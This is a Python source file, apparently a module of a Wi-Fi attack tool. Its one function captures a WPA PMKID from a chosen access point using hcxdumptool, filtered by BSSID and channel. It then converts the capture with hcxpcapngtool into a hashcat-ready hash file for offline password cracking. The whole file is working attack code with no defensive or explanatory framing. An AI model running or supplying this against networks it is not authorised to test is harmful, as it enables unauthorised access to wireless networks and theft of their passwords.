import subprocess
import time
import os

def capture_pmkid(interface, target, timeout=15):
    bssid = target.get("BSSID")
    essid = target.get("ESSID")
    channel = target.get("channel")

    if not all([bssid, essid, channel]):
        print("[!] Target information is incomplete for PMKID attack.")
        return None

    print(f"[*] Starting PMKID capture on {essid} (channel {channel}) for {timeout} seconds...")
    
    output_file = "pmkid.pcapng"
    if os.path.exists(output_file):
        os.remove(output_file)

    try:
        # Run hcxdumptool to capture the PMKID
        proc = subprocess.Popen([
            "hcxdumptool",
            "-i", interface,
            "-o", output_file,
            "--filterlist_ap", bssid,
            "--filtermode", "2",
            "--enable_status", "1",
            "-c", channel,
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(timeout)
        proc.terminate()
        proc.wait()

        if not os.path.exists(output_file):
            print("[-] PMKID capture failed: hcxdumptool did not create an output file.")
            return None

        # Convert the capture to a hashcat-compatible format
        hash_file = "pmkid.16800"
        if os.path.exists(hash_file):
            os.remove(hash_file)
            
        subprocess.run([
            "hcxpcapngtool",
            "-o", hash_file,
            output_file
        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            print(f"[+] PMKID captured and converted to hash file: {hash_file}")
            return hash_file
        else:
            print("[-] PMKID capture failed: Could not convert capture to hash format.")
            return None

    except FileNotFoundError as e:
        print(f"[!] Dependency not found: {e.filename}. Please install hcxdumptool and hcxtools.")
        return None
    except subprocess.CalledProcessError:
        print("[-] PMKID capture failed during hash conversion.")
        return None
    except Exception as e:
        print(f"[!] An unexpected error occurred during PMKID capture: {e}")
        return None
